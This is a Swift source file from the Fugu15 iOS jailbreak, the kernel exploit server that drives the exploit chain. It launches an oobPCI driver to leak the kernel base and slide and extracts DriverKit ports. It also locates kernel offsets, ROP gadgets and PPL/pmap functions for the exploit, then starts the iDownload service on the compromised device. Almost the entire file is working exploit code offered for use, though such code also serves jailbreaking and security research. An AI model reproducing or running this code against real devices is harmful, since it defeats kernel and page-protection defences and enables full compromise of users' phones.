//
//  Fugu15.swift
//  Fugu15KernelExploit
//
//  Created by Linus Henze.
//  Copyright © 2021/2022 Pinauten GmbH. All rights reserved.
//

import Foundation
import ProcessCommunication
import CBindings
import KernelPatchfinder
import iDownload

extension Fugu15 {
    internal static func serverMain(checkin: DKCheckinData) -> Never {
        setsid()
        
        let controlIn = FileHandle(fileDescriptor: Int32(CommandLine.arguments[2])!, closeOnDealloc: true)
        let controlOut = FileHandle(fileDescriptor: Int32(CommandLine.arguments[3])!, closeOnDealloc: true)
        
        let comm = ProcessCommunication(read: controlIn, write: controlOut)
        
        var exitStatus: Int32?
        var done = false
        var exceptionHandler: UInt64?
        var detach = false
        
        while true {
            guard let cmd = comm.receiveCommand() else {
                // Probably broken pipe
                if !detach {
                    exit(-1)
                }
                
                Logger.logFileHandle = nil
                dispatchMain()
            }
            
            switch cmd[0] {
            case "ping":
                Logger.print("Hello from kernel exploit server!")
                Logger.print("My UID is \(getuid())")
                Logger.print("My GID is \(getgid())")
                
                comm.sendCommand("pong")
                
            case "pwn":
                do {
                    Logger.status("Launching oobPCI")
                    
                    guard cmd.count == 2 else {
                        comm.sendCommand("error", "Usage: pwn <oobPCI path>")
                        
                        break
                    }
                    
                    var args: [String] = []
                    if ProcessInfo.processInfo.operatingSystemVersion.minorVersion == 5 {
                        args.append("155")
                    }
                    
                    let driver = SpawnDrv(executable: URL(fileURLWithPath: cmd[1]))
                    driver.onExit { driver, status in
                        exitStatus = status
                    }
                    
                    try driver.launch(arguments: args, checkinData: checkin) { driver, task, thread, state in
                        let pc = thread_state64_get_pc(&state)
                        let lr = thread_state64_get_lr(&state)
                        
                        switch pc {
                        case 0x4142434404:
                            // Done notification
                            Logger.print("Got child notification!")
                            Logger.print(String(format: "Kernel base @ %p", state.__x.0))
                            Logger.print(String(format: "Kernel slide %p", state.__x.0 &- 0xFFFFFFF007004000))
                            Logger.print(String(format: "Virtual base @ %p", state.__x.1))
                            Logger.print(String(format: "Physical base @ %p", state.__x.2))
                            
                            kernelBase  = state.__x.0
                            kernelSlide = state.__x.0 &- 0xFFFFFFF007004000
                            
                            // Lock both locks to ensure threads will block later on
                            // FIXME: This should be somewhere else
                            sendRequestLock.lock()
                            replyLock.lock()
                            
                            done = true
                            
                        case 0x4841585800:
                            // Patchfind
                            return handlePatchfindRequest(driver, task, thread, &state)
                            
                        case 0x4841585808:
                            // Set exception handler
                            exceptionHandler = state.__x.0
                            break
                            
                        case 0x484158580C:
                            // Get request
                            // Attempt to lock the send request lock
                            // (This will block until we have something to send)
                            sendRequestLock.lock()
                            
                            // Ensure all writes are visible
                            OSMemoryBarrier()
                            
                            // Copy Request over to child
                            task.w64(state.__x.0, requestAddrPid)
                            task.w64(state.__x.1, requestSize)
                            if let rb = requestBuf {
                                task.write(addr: state.__x.2, data: rb)
                            }
                            
                            state.__x.0 = request
                            
                        case 0x4841585810:
                            // Set reply values
                            replyStatus = state.__x.0
                            replyResult = state.__x.1
                            if state.__x.3 != 0 {
                                replyBuf = task.read(addr: state.__x.2, size: Int(state.__x.3))
                            } else {
                                replyBuf = nil
                            }
                            
                            // Ensure all writes are visible
                            OSMemoryBarrier()
                            
                            replyLock.unlock()
                            
                        case 0x4841585814:
                            // Kernel exploit done notification
                            Logger.print("Attempting to copy out DK ports...")
                            let dkServerPortName = mach_port_name_t(state.__x.0)
                            let devPortName      = mach_port_name_t(state.__x.1)
                            
                            var dkServerPort: mach_port_t = 0
                            var devPort:      mach_port_t = 0
                            
                            var acquired: mach_msg_type_name_t = 0
                            
                            var kr = mach_port_extract_right(task.tp, dkServerPortName, mach_msg_type_name_t(MACH_MSG_TYPE_COPY_SEND), &dkServerPort, &acquired)
                            guard kr == KERN_SUCCESS else {
                                Logger.print("Failed to copyout dkServerPort: \(kr)")
                                return KERN_FAILURE
                            }
                            
                            kr = mach_port_extract_right(task.tp, devPortName, mach_msg_type_name_t(MACH_MSG_TYPE_COPY_SEND), &devPort, &acquired)
                            guard kr == KERN_SUCCESS else {
                                Logger.print("Failed to copyout devPort: \(kr)")
                                return KERN_FAILURE
                            }
                            
                            Logger.print("Copied out DK ports!")
                            
                            // FIXME: Initialize KRW here...
                            
                        default:
                            if let exceptionHandler = exceptionHandler {
                                thread_state64_set_pc(&state, exceptionHandler)
                                return KERN_SUCCESS
                            } else {
                                return KERN_FAILURE
                            }
                        }
                        
                        thread_state64_set_pc(&state, lr)
                        return KERN_SUCCESS
                    }
                    
                    comm.sendCommand("ok")
                } catch let e {
                    Logger.print("SpawnDriver failed: \(e)")
                    
                    comm.sendCommand("error", "SpawnDrv failed!")
                }
                
            case "waitUntilDone":
                while !done && exitStatus == nil {
                    usleep(10000)
                }
                
                if done {
                    /*if let mapped = oobPCIMapMagicPage(pid: getpid()) {
                        Logger.print("Mapped: \(String(format: "%p", mapped.magicPageUInt64))")
                        Logger.print("Content: \(String(format: "%p", mapped.magicPage[0]))")
                        
                        comm.sendCommand("done")
                    } else {
                        Logger.print("Uh-oh, oobPCIMapMagicPage failed!")
                        
                        comm.sendCommand("error", "oobPCIMapMagicPage")
                    }*/
                    
                    comm.sendCommand("done")
                } else {
                    comm.sendCommand("error", "Exit status: \(exitStatus.unsafelyUnwrapped)")
                }
                
            case "launch_iDownload":
                while !done && exitStatus == nil {
                    usleep(10000)
                }
                
                if done {
                    setenv("PATH", "/sbin:/bin:/usr/sbin:/usr/bin:/private/preboot/jb/sbin:/private/preboot/jb/bin:/private/preboot/jb/usr/sbin:/private/preboot/jb/usr/bin", 1)
                    setenv("TERM", "xterm-256color", 1)
                    
                    do {
                        try iDownload.launch_iDownload(krw: iDownloadKRW(), otherCmds: iDownloadCmds)
                        
                        detach = true
                        
                        comm.sendCommand("done")
                    } catch let e {
                        Logger.print("Failed to launch iDownload: \(e)")
                        
                        comm.sendCommand("error", "iDownload: \(e)")
                    }
                } else {
                    comm.sendCommand("error", "Exit status: \(exitStatus.unsafelyUnwrapped)")
                }
                
            default:
                comm.sendCommand("error", "Unknown command \(cmd[0])!")
            }
        }
    }
    
    internal static func handlePatchfindRequest(_ driver: SpawnDrv, _ child: Task, _ thread: Thread, _ state: inout arm_thread_state64_t) -> kern_return_t {
        // Patchfind stuff
        let offsetInfoAddr = state.__x.1
        func writeOffsetInfo(_ pos: Int, value: UInt64) {
            Logger.print("Pos \(pos): " + String(format: "%p", value))
            child.w64(offsetInfoAddr + UInt64(pos * 8), value)
        }
        
        var ok = false
        repeat {
            Logger.print("Loading kernel...")
            var start = time(nil)
            
            guard let pf = patchfinder else {
                Logger.print("Failed: KernelPatchfinder.running")
                break
            }
            
            Logger.print("Loading took \(time(nil) - start) second(s)!")
            
            Logger.print("Patchfinding...")
            
            start = time(nil)
            
            writeOffsetInfo(0, value: state.__x.0 &- 0xFFFFFFF007004000) // Kernel slide
            
            guard let allproc = pf.allproc else {
                Logger.print("Failed: pf.allproc")
                break
            }
            
            writeOffsetInfo(1, value: allproc)
            
            guard let ITK_SPACE = pf.ITK_SPACE else {
                Logger.print("Failed: pf.ITK_SPACE")
                break
            }
            
            writeOffsetInfo(2, value: ITK_SPACE)
            
            guard let cpu_ttep = pf.cpu_ttep else {
                Logger.print("Failed: pf.cpu_ttep")
                break
            }
            
            writeOffsetInfo(3, value: cpu_ttep)
            
            guard let pmap_enter_options_addr = pf.pmap_enter_options_addr else {
                Logger.print("Failed: pf.pmap_enter_options_addr")
                break
            }
            
            writeOffsetInfo(4, value: pmap_enter_options_addr)
            
            guard let hw_lck_ticket_reserve_orig_allow_invalid_signed = pf.hw_lck_ticket_reserve_orig_allow_invalid_signed else {
                Logger.print("Failed: pf.hw_lck_ticket_reserve_orig_allow_invalid_signed")
                break
            }
            
            writeOffsetInfo(5, value: hw_lck_ticket_reserve_orig_allow_invalid_signed)
            
            guard let hw_lck_ticket_reserve_orig_allow_invalid = pf.hw_lck_ticket_reserve_orig_allow_invalid else {
                Logger.print("Failed: pf.hw_lck_ticket_reserve_orig_allow_invalid")
                break
            }
            
            writeOffsetInfo(6, value: hw_lck_ticket_reserve_orig_allow_invalid)
            
            guard let br_x22_gadget = pf.br_x22_gadget else {
                Logger.print("Failed: pf.br_x22_gadget")
                break
            }
            
            writeOffsetInfo(7, value: br_x22_gadget)
            
            guard let exception_return = pf.exception_return else {
                Logger.print("Failed: pf.exception_return")
                break
            }
            
            writeOffsetInfo(8, value: exception_return)
            
            guard let ldp_x0_x1_x8_gadget = pf.ldp_x0_x1_x8_gadget else {
                Logger.print("Failed: pf.ldp_x0_x1_x8_gadget")
                break
            }
            
            writeOffsetInfo(9, value: ldp_x0_x1_x8_gadget)
            
            guard let exception_return_after_check = pf.exception_return_after_check else {
                Logger.print("Failed: pf.exception_return_after_check")
                break
            }
            
            writeOffsetInfo(10, value: exception_return_after_check)
            
            guard let exception_return_after_check_no_restore = pf.exception_return_after_check_no_restore else {
                Logger.print("Failed: pf.exception_return_after_check_no_restore")
                break
            }
            
            writeOffsetInfo(11, value: exception_return_after_check_no_restore)
            
            guard let str_x8_x9_gadget = pf.str_x8_x9_gadget else {
                Logger.print("Failed: pf.str_x8_x9_gadget")
                break
            }
            
            writeOffsetInfo(12, value: str_x8_x9_gadget)
            
            guard let str_x0_x19_ldr_x20 = pf.str_x0_x19_ldr_x20 else {
                Logger.print("Failed: pf.str_x0_x19_ldr_x20")
                break
            }
            
            writeOffsetInfo(13, value: str_x0_x19_ldr_x20)
            
            guard let pmap_set_nested = pf.pmap_set_nested else {
                Logger.print("Failed: pf.pmap_set_nested")
                break
            }
            
            writeOffsetInfo(14, value: pmap_set_nested)
            
            guard let pmap_nest = pf.pmap_nest else {
                Logger.print("Failed: pf.pmap_nest")
                break
            }
            
            writeOffsetInfo(15, value: pmap_nest)
            
            guard let pmap_remove_options = pf.pmap_remove_options else {
                Logger.print("Failed: pf.pmap_remove_options")
                break
            }
            
            writeOffsetInfo(16, value: pmap_remove_options)
            
            guard let pmap_mark_page_as_ppl_page = pf.pmap_mark_page_as_ppl_page else {
                Logger.print("Failed: pf.pmap_mark_page_as_ppl_page")
                break
            }
            
            writeOffsetInfo(17, value: pmap_mark_page_as_ppl_page)
            
            guard let pmap_create_options = pf.pmap_create_options else {
                Logger.print("Failed: pf.pmap_create_options")
                break
            }
            
            writeOffsetInfo(18, value: pmap_create_options)
            
            guard let ml_sign_thread_state = pf.ml_sign_thread_state else {
                Logger.print("Failed: pf.ml_sign_thread_state")
                break
            }
            
            writeOffsetInfo(19, value: ml_sign_thread_state)
            
            guard let kernel_el = pf.kernel_el else {
                Logger.print("Failed: pf.kernel_el")
                break
            }
            
            writeOffsetInfo(20, value: kernel_el << 2)
            
            guard let TH_RECOVER = pf.TH_RECOVER else {
                Logger.print("Failed: pf.TH_RECOVER")
                break
            }
            
            writeOffsetInfo(21, value: TH_RECOVER)
            
            guard let TH_KSTACKPTR = pf.TH_KSTACKPTR else {
                Logger.print("Failed: pf.TH_KSTACKPTR")
                break
            }
            
            writeOffsetInfo(22, value: TH_KSTACKPTR)
            
            guard let ACT_CONTEXT = pf.ACT_CONTEXT else {
                Logger.print("Failed: pf.ACT_CONTEXT")
                break
            }
            
            writeOffsetInfo(23, value: ACT_CONTEXT)
            
            guard let ACT_CPUDATAP = pf.ACT_CPUDATAP else {
                Logger.print("Failed: pf.ACT_CPUDATAP")
                break
            }
            
            writeOffsetInfo(24, value: ACT_CPUDATAP)
            
            var PORT_KOBJECT: UInt64 = 0x58
            if ProcessInfo.processInfo.operatingSystemVersion.majorVersion >= 15 && ProcessInfo.processInfo.operatingSystemVersion.minorVersion >= 2 {
                PORT_KOBJECT = 0x48
            }
            
            writeOffsetInfo(25, value: PORT_KOBJECT)
            
            guard let VM_MAP_PMAP = pf.VM_MAP_PMAP else {
                Logger.print("Failed: pf.VM_MAP_PMAP")
                break
            }
            
            writeOffsetInfo(26, value: VM_MAP_PMAP)
            
            guard let PORT_LABEL = pf.PORT_LABEL else {
                Logger.print("Failed: pf.PORT_LABEL")
                break
            }
            
            writeOffsetInfo(27, value: PORT_LABEL)
            
            Logger.print("Patchfinding took \(time(nil) - start) second(s)!")
            
            ok = true
        } while false
        
        state.__x.0 = ok ? 1 : 0
        
        let lr = thread_state64_get_lr(&state)
        thread_state64_set_pc(&state, lr)
        
        return ok ? KERN_SUCCESS : KERN_FAILURE
    }
    
    static func oobPCIRequest(id: UInt64, addrPid: UInt64, size: UInt64 = 0, buf: Data? = nil) -> (status: UInt64, result: UInt64, data: Data?) {
        // Take the request lock
        requestLock.lock()
        
        // Write request
        request        = id
        requestAddrPid = addrPid
        requestSize    = size
        requestBuf     = buf
        
        // Ensure all writes are visible
        OSMemoryBarrier()
        
        // Send the request
        sendRequestLock.unlock()
        
        // Acquire reply lock
        replyLock.lock()
        
        // Ensure all writes are visible
        OSMemoryBarrier()
        
        let res = (status: replyStatus, result: replyResult, data: replyBuf)
        
        // Ensure read is not re-ordered
        OSMemoryBarrier()
        
        requestLock.unlock()
        
        return res
    }
    
    /*static func oobPCIMapMagicPage(pid: pid_t) -> PPLRW? {
        let rsp = oobPCIRequest(id: 7, addrPid: UInt64(pid))
        guard rsp.status == 0 else {
            Logger.print("oobPCI failed to map magic PPL page! Status: \(rsp.status)")
            return nil
        }
        
        return PPLRW(magicPage: rsp.result)
    }*/
}
